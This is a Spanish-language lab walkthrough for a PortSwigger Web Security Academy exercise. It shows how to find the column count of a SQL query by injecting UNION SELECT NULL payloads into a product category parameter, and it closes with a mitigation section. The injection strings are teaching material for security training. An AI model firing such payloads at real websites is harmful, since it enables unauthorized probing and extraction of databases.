# SQL Injection UNION Attack – Determinar el número de columnas

## 🧪 Laboratorio

PortSwigger Web Security Academy – SQL Injection

**Laboratorio:** SQL injection UNION attack, determining the number of columns returned by the query

**Categoría:** SQL Injection

**Dificultad:** Practitioner

---

## 🎯 Objetivo

La aplicación contiene una vulnerabilidad de SQL Injection en el filtro de categoría de productos.

El objetivo del laboratorio es determinar **cuántas columnas devuelve la consulta SQL original** mediante un ataque `UNION SELECT` que agregue una fila adicional formada por valores `NULL`.

---

## 🔎 1. Interceptar la petición

Utilizamos **Burp Suite** para interceptar la petición generada al seleccionar una categoría de productos.

La petición contiene un parámetro similar a:

```http
GET /filter?category=Pets
```

El parámetro `category` es el punto vulnerable que utilizaremos para realizar la inyección.

---

## 🧪 2. Probar una columna

Comenzamos modificando el valor de `category` para introducir un `UNION SELECT` con una única columna:

```text
'+UNION+SELECT+NULL--
```

La aplicación devuelve un error.

Esto indica que el número de columnas del `UNION SELECT` no coincide con el número de columnas de la consulta original.

---

## 🧪 3. Probar dos columnas

Agregamos una segunda columna:

```text
'+UNION+SELECT+NULL,NULL--
```

La aplicación continúa devolviendo un error.

Por lo tanto, la consulta original devuelve más de dos columnas.

---

## 🧪 4. Probar tres columnas

Finalmente agregamos un tercer valor `NULL`:

```text
'+UNION+SELECT+NULL,NULL,NULL--
```

En este caso, la aplicación acepta la consulta y devuelve contenido adicional.

El laboratorio queda marcado como **Solved**.

---

## ✅ Resultado

El payload exitoso fue:

```text
'+UNION+SELECT+NULL,NULL,NULL--
```

Esto confirma que la consulta SQL original devuelve:

```text
3 columnas
```

Por lo tanto, cualquier ataque `UNION SELECT` posterior contra esta consulta deberá utilizar **tres columnas**.

---

## 🧠 ¿Por qué funciona?

Cuando utilizamos `UNION`, ambas consultas deben devolver el mismo número de columnas.

Por ejemplo, si la consulta original devuelve:

```sql
SELECT column1, column2, column3
FROM products
```

el `UNION` debe tener también tres columnas:

```sql
UNION SELECT NULL, NULL, NULL
```

Si intentamos utilizar solamente una o dos columnas, las estructuras no coinciden y la base de datos genera un error.

Por eso podemos determinar el número de columnas incrementando progresivamente la cantidad de valores `NULL`.

---

## 📊 Secuencia de pruebas

| Prueba | Resultado |
|---|---|
| `NULL` | ❌ Error |
| `NULL,NULL` | ❌ Error |
| `NULL,NULL,NULL` | ✅ Correcto |

Resultado final:

> **La consulta devuelve 3 columnas.**

---

## 🛡️ Mitigación

La vulnerabilidad de SQL Injection puede prevenirse evitando que los datos proporcionados por el usuario sean incorporados directamente en las consultas SQL.

Las principales medidas de protección son:

- Utilizar consultas parametrizadas (*prepared statements*).
- No concatenar directamente datos controlados por el usuario en consultas SQL.
- Implementar una validación adecuada de las entradas.
- Utilizar cuentas de base de datos con los privilegios mínimos necesarios.
- Evitar mostrar errores detallados de la base de datos al usuario.
- Realizar pruebas de seguridad periódicas sobre las aplicaciones.

---

## 📚 Referencias

- PortSwigger Web Security Academy – SQL Injection
